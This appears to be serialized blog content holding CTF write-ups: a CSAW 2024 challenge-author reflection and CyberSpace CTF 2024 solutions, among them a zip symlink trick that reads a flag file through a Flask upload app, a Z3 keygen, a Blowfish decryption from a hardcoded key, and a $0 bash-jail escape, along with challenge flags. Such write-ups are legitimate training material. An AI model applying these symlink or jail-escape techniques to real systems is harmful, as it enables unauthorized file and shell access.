style=\"color:#2B5581;--shiki-dark:#ECC48D\"> Make\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> your\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> guess!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">hexadecimals\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> only,\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> so\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> something\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> like\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0xA\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> would\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> work\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">guess\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">> \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0x7ffeb79507d0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\"> .\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> .\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> .\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Okay,\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> prepare\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> yourself.\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> If\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> you\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">re right this\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">will print out the flag\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\"> .\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Oh, and if your wrong, this might crash and\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">disconnect you\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Good luck!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">bcactf{0nE_two_thR3E_f0ur_567___sT3ps_t0_PwN4G3_70cc0e5edd6ea}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>",{"headings":59,"imagePaths":73,"frontmatter":46},[60,61,64,68,71],{"depth":26,"slug":27,"text":28},{"depth":30,"slug":62,"text":63},"binary-exploitation","Binary Exploitation",{"depth":65,"slug":66,"text":67},3,"inaccessable","Inaccessable",{"depth":65,"slug":69,"text":70},"canary-keeper","canary keeper",{"depth":65,"slug":72,"text":72},"pwnage",[],"csaw-2024",{"id":74,"data":76,"body":83,"filePath":84,"digest":85,"rendered":86},{"author":12,"pubDatetime":77,"modDatetime":78,"title":79,"tags":80,"description":82},["Date","2024-09-07T15:22:00.000Z"],["Date","2023-12-21T09:12:47.400Z"],"csaw 2024 thoughts",[81],"personal","Some thoughts and reflection on the first official ctf i helped write challenges for!","\n## Background Information\n\nSo uh, a little background info. How in the hell did this bum from New Jersey who sucks at CTFs be able to write for one of the biggest CTFs? To be honest, I don't know. I was hunting for internships and the very generous people of NYU OSIRIS lab reached back to me and offered me a chance to write some challenges for CSAW quals. So big thanks. (Should've wrote some more pwn based on the feedback...)\n\n### mini golfing\n\nOk so I made this when I heard that there was a lack of pwn challenges. Tbh im not really that good at pwn. Sure, I can do some buffer overflows or maybe format string but I'm not super good at pwn. So I decided to just make a pretty simple challenge based on something pretty cool I found out about PIE. So what is it?\n\nSo basically, when a binary has PIE, the addresses of that binary are randomized. But apparently the last four(?) bits or numbers of the hex address remain static. So what I basically envisioned was to introduce that information in a more easier(?) way... maybe in a way that I would understand.\n\nTherefore, my brain went to one thing -> pwn golf!\n\nPwn golf is basically a basic challenge whree you find a pointer pointing to a function (usually win), put it in and the program will run that pointer as a function.\n\nI decided to add a little bit more complexity through simple math. So basically it would leak main, and all you gotta do is just find its offset to win in order to well, win.\n\n\n### Magic Tricks\n\nWe don't talk about this challenge because it got easily solved through side-channel analysis even though that was what I was not going for in the solve path. But kudos for CTF players for being creative and efficient.\n","src/content/blog/csaw-2024.md","49fbef0711bd487b",{"html":87,"metadata":88},"\u003Ch2 id=\"background-information\">Background Information\u003C/h2>\n\u003Cp>So uh, a little background info. How in the hell did this bum from New Jersey who sucks at CTFs be able to write for one of the biggest CTFs? To be honest, I don’t know. I was hunting for internships and the very generous people of NYU OSIRIS lab reached back to me and offered me a chance to write some challenges for CSAW quals. So big thanks. (Should’ve wrote some more pwn based on the feedback…)\u003C/p>\n\u003Ch3 id=\"mini-golfing\">mini golfing\u003C/h3>\n\u003Cp>Ok so I made this when I heard that there was a lack of pwn challenges. Tbh im not really that good at pwn. Sure, I can do some buffer overflows or maybe format string but I’m not super good at pwn. So I decided to just make a pretty simple challenge based on something pretty cool I found out about PIE. So what is it?\u003C/p>\n\u003Cp>So basically, when a binary has PIE, the addresses of that binary are randomized. But apparently the last four(?) bits or numbers of the hex address remain static. So what I basically envisioned was to introduce that information in a more easier(?) way… maybe in a way that I would understand.\u003C/p>\n\u003Cp>Therefore, my brain went to one thing -> pwn golf!\u003C/p>\n\u003Cp>Pwn golf is basically a basic challenge whree you find a pointer pointing to a function (usually win), put it in and the program will run that pointer as a function.\u003C/p>\n\u003Cp>I decided to add a little bit more complexity through simple math. So basically it would leak main, and all you gotta do is just find its offset to win in order to well, win.\u003C/p>\n\u003Ch3 id=\"magic-tricks\">Magic Tricks\u003C/h3>\n\u003Cp>We don’t talk about this challenge because it got easily solved through side-channel analysis even though that was what I was not going for in the solve path. But kudos for CTF players for being creative and efficient.\u003C/p>",{"headings":89,"imagePaths":97,"frontmatter":76},[90,91,94],{"depth":30,"slug":27,"text":28},{"depth":65,"slug":92,"text":93},"mini-golfing","mini golfing",{"depth":65,"slug":95,"text":96},"magic-tricks","Magic Tricks",[],"csctf-2024",{"id":98,"data":100,"body":106,"filePath":107,"digest":108,"rendered":109},{"author":12,"pubDatetime":101,"modDatetime":102,"title":103,"tags":104,"description":105},["Date","2022-08-28T15:22:00.000Z"],["Date","2023-12-21T09:12:47.400Z"],"csctf 2024",[51],"Here is the solutions to some of the challenges in CyberSpace CTF","\n# Background Information\n\nI did this with team lazy bums but we did trash as usual.\n\n## Web\n\n### ZipZone\n> I was tired of trying to find a good file server for zip files, so I made my own! It's still a work in progress, but I think it's pretty good so far.\n\nOk, so first this we can see is that we can upload a file and that we can view / download whatever we extracted. \n\nBefore we start, let's analyze the source code of the web application.\n\n```python\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\ndef upload():\n    if request.method == \"GET\":\n        return render_template(\"index.html\")\n\n    if \"file\" not in request.files:\n        flash(\"No file part!\", \"danger\")\n        return render_template(\"index.html\")\n\n    file = request.files[\"file\"]\n    if file.filename.split(\".\")[-1].lower() != \"zip\":\n        flash(\"Only zip files allowed are allowed!\", \"danger\")\n        return render_template(\"index.html\")\n\n    upload_uuid = str(uuid.uuid4())\n    filename = f\"{upload_dir}raw/{upload_uuid}.zip\"\n    file.save(filename)\n    subprocess.call([\"unzip\", filename, \"-d\", f\"{upload_dir}files/{upload_uuid}\"])\n    flash(\n        f'Your file is at \u003Ca href=\"/files/{upload_uuid}\">{upload_uuid}\u003C/a>!', \"success\"\n    )\n    logging.info(f\"User uploaded file {upload_uuid}.\")\n    return redirect(\"/\")\n\n\n@app.route(\"/files/\u003Cpath:path>\")\ndef files(path):\n    try:\n        return send_from_directory(upload_dir + \"files\", path)\n    except PermissionError:\n        abort(404)\n\n\n@app.errorhandler(404)\ndef page_not_found(error):\n    return render_template(\"404.html\")\n\n```\n\nIgnoring all the basic web application setup, what we really care about is WHAT WE CAN PREDICTABLY CONTROL. So we should only analyze the `subprocess.call()` function since that is the only \"dangerous\" function we can mess with.\n\nA tip is that whenever we deal with compressed files, such as `zip` or `tar` the problem of `symbolic links` come up. Symbolic links are basically files that \"point\" to other files. Vulnerable web applications such as this do not verify if the decompressed file is a symlink. So with that fact, we can build the process.\n\n1. Create a symlink to flag\n2. Upload the symlink\n3. Profit $$$$$$\n\nSo lets symlink and zip it. (The flag stuff was based on analysis on the Dockerfile)\n\n```bash\nln -s ../../../home/user/flag.txt flag\nzip -r flag.zip flag\n```\n\nWe then send it, download it, and... we profit! \n\n> CSCTF{5yml1nk5_4r3_w31rd}\n\n## Reverse Engineering\n\n### Key\n\n> GDB is cool! Ghidra or IDA is helpful\n\nThis is a basic keygen + password checking crackme. What we do is just find the algorithm in a disassembler like `Ghidra` and put the algorithm in a Z3 script.\n\nSolution:\n\n```python\nfrom z3 import *\n\n# Initialize a solver\nsolver = Solver()\n\n# Define the 32-byte key as a list of BitVecs\nkey = [BitVec(f'key_{i}', 8) for i in range(32)]\n\n# Define the values of v6\nv6 = [\n    67, 164, 65, 174, 66, 252, 115, 176, 111, 114, 94, 168, 101, 242, 81, 206,\n    32, 188, 96, 164, 109, 70, 33, 64, 32, 90, 44, 82, 45, 94, 45, 196\n]\n\n# Define the constraints based on the program logic\nfor i in range(32):\n    transformed_value = (i % 2 + 1) * (i ^ key[i])\n    solver.add(transformed_value == v6[i])\n\n# Check if the solution exists\nif solver.check() == sat:\n    model = solver.model()\n    result_key = ''.join([chr(model[key[i]].as_long()) for i in range(32)])\n    print(\"Key found:\", result_key)\nelse:\n    print(\"No solution found.\")\n\n```\n> CSCTF{u_g0T_it_h0OrAy6778462123}\n\n### Encryptor\n\n> My friend sent me this app with an encoded flag, but he forgot to implement the decryption algorithm! Can you help me out?\n\nThis is an android web application. So what we can do is use JADX decompiler to analyze the java kotlin code that makes up this application\n\nIn `resources` we get a basic enc.txt file with content:\n\n```\nOIkZTMehxXAvICdQSusoDP6Hn56nDiwfGxt7w/Oia4oxWJE3NVByYnOMbqTuhXKcgg50DmVpudg=\n```\n\nThis is encrypted not encoded, so we need to find the encryption algorithm for this.\n\nUpon more investigation we find the encryption algorithm in `sources/com/example/encryptor/MainActivity.java`. It's blowfish. \n\n```java\n  private String getKey() {\n        return new String(Base64.decode(\"ZW5jcnlwdG9yZW5jcnlwdG9y\".getBytes(), 0));\n    }\n\n    private String encryptText(String str) throws InvalidKeyException, UnsupportedEncodingException, NoSuchPaddingException, NoSuchAlgorithmException, IllegalBlockSizeException, BadPaddingException {\n        SecretKeySpec secretKeySpec = new SecretKeySpec(getKey().getBytes(\"UTF-8\"), \"Blowfish\");\n        Cipher instance = Cipher.getInstance(\"Blowfish\");\n        if (instance != null) {\n            instance.init(1, secretKeySpec);\n            return Build.VERSION.SDK_INT >= 26 ? new String(Base64.encode(instance.doFinal(str.getBytes(\"UTF-8\")), 0)) : \"\";\n        }\n        throw new Error();\n    }\n```\n\nSo we can just make a script in python that solves this.\n\n```python\nfrom Crypto.Cipher import Blowfish\nfrom base64 import b64decode\n\ndef decrypt_text(encrypted_text):\n    # The key used in the Java code\n    key = \"encryptorencryptor\".encode('utf-8')\n\n    # Decode the Base64 encoded string\n    encrypted_data = b64decode(encrypted_text)\n\n    # Initialize the Blowfish cipher in ECB mode\n    cipher = Blowfish.new(key, Blowfish.MODE_ECB)\n\n    # Decrypt the data\n    decrypted_data = cipher.decrypt(encrypted_data)\n\n    # Remove potential padding added during encryption (since Blowfish is a block cipher)\n    decrypted_text = decrypted_data.rstrip(b\"\\x00\")\n\n    return decrypted_text.decode('utf-8')\n\n# Example usage\nencrypted_text = \"OIkZTMehxXAvICdQSusoDP6Hn56nDiwfGxt7w/Oia4oxWJE3NVByYnOMbqTuhXKcgg50DmVpudg=\"\ndecrypted_text = decrypt_text(encrypted_text)\nprint(\"Decrypted text:\", decrypted_text)\n\n```\n\nAnd we get the flag! \n\n> CSCTF{3ncrypt0r_15nt_s4Fe_w1th_4n_h4Rdc0d3D_k3y!}\n\n## Sandbox\n\n### Baby Pybash\n\n>I made a very secure bash terminal in Python. I don't think anyone can break in!\n\nSo we enter a \"python bash jail\" where we are restricted from certain characters in input to make commands. Let's analyze the source code to see what we are missing.\n\n```python\n#!/usr/local/bin/python3 -u\nimport subprocess\nimport re\n\n\ndef restrict_input(command):\n    pattern = re.compile(r'[a-zA-Z*^\\,,;\\\\!@/#?%`\"\\'&()-+]|[^\\x00-\\x7F]')\n    if pattern.search(command):\n        raise ValueError(\"that's not nice!\")\n    return command\n\n\ndef execute_command(command):\n    safe = restrict_input(command)\n    result = subprocess.run(safe, stdout=True, shell=True)\n    return result.stdout\n\n\nprint(\"Welcome to Baby PyBash!\\n\")\ncmd = input(\"Enter a bash command: \")\noutput = execute_command(cmd)\nprint(output)\n```\nWow. We are restricted from the entire alphabet and other special fonts that would bypass like italics. However, we are allowed certian special characters and numbers. \n\nSo what we can do is call `$0` since that calls /bin/bash. Then we can profit!\n\n```bash\n== proof-of-work: disabled ==\nWelcome to Baby PyBash!\n\nEnter a bash command: $0\nls\nchall.py\nflag.txt\nrun.sh\ncat flag.txt\nCSCTF{b4sH_w1z4rd_0r_ju$t_ch33s3_m4st3r?_c1d4eeb2a}\n\n```\n\n> CSCTF{b4sH_w1z4rd_0r_ju$t_ch33s3_m4st3r?_c1d4eeb2a}","src/content/blog/csctf-2024.md","154b89b8e6c36eb9",{"html":110,"metadata":111},"\u003Ch1 id=\"background-information\">Background Information\u003C/h1>\n\u003Cp>I did this with team lazy bums but we did trash as usual.\u003C/p>\n\u003Ch2 id=\"web\">Web\u003C/h2>\n\u003Ch3 id=\"zipzone\">ZipZone\u003C/h3>\n\u003Cblockquote>\n\u003Cp>I was tired of trying to find a good file server for zip files, so I made my own! It’s still a work in progress, but I think it’s pretty good so far.\u003C/p>\n\u003C/blockquote>\n\u003Cp>Ok, so first this we can see is that we can upload a file and that we can view / download whatever we extracted.\u003C/p>\n\u003Cp>Before we start, let’s analyze the source code of the web application.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">@\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\">app\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#C5E478\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\">route\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">/\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D7DBE0\"> methods\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">[\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">GET\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">, \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">POST\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">def\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> upload\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> request\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">method \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">==\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">GET\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> render_template\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">index.html\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    if\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">file\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> not\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> in\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> request\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">files\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">        flash\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">No file part!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">danger\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> render_template\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">index.html\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">    file\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> request\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">files\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">file\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> file\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">filename\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">split\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">.\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">[\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">-\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">lower\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> !=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">zip\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">        flash\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Only zip files allowed are allowed!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">danger\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> render_template\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">index.html\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    upload_uuid \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> str\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">uuid.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">uuid4\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    filename \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">upload_dir\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">raw/\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">upload_uuid\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">.zip\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">    file\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">save\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">filename\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    subprocess\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">call\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">[\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan 